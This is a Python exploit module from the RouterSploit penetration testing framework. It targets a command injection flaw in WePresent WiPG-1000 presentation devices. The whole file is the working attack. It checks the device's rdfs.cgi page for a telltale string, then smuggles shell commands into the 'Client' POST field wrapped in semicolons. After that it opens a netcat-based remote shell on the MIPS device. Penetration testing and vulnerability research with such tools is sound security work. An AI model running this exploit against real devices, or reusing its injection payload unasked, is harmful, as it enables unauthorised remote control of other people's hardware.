from routersploit import (
    exploits,
    print_success,
    print_error,
    print_status,
    http_request,
    mute,
    validators,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for WePresent WiPG-1000 Command Injection vulnerability.
    If the target is vulnerable, it is possible to execute commands on operating system level.
    """
    __info__ = {
        'name': 'WePresent WiPG-1000 RCE',
        'description': 'Module exploits WePresent WiPG-1000 Command Injection vulnerability which allows '
                       'executing commands on operating system level.',
        'authors': [
            'Matthias Brun',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.redguard.ch/advisories/wepresent-wipg1000.txt',
        ],
        'devices': [
            'WePresent WiPG-1000 <=2.0.0.7',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port', validators=validators.integer)

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("This is blind command injection, response is not available")
            shell(self, architecture="mips", binary="netcat", shell="/bin/sh")
        else:
            print_error("Exploit failed - exploit seems to be not vulnerable")

    def execute(self, cmd):
        """ callback used by shell functionality """
        payload = ";{};".format(cmd)

        url = "{}:{}/cgi-bin/rdfs.cgi".format(self.target, self.port)
        data = {
            "Client": payload,
            "Download": "Download"
        }

        http_request(method="POST", url=url, data=data)
        return ""

    @mute
    def check(self):
        url = "{}:{}/cgi-bin/rdfs.cgi".format(self.target, self.port)
        response = http_request(method="GET", url=url)

        if response is not None and "Follow administrator instructions to enter the complete path" in response.text:
            return True  # target vulnerable

        return False  # target is not vulnerable
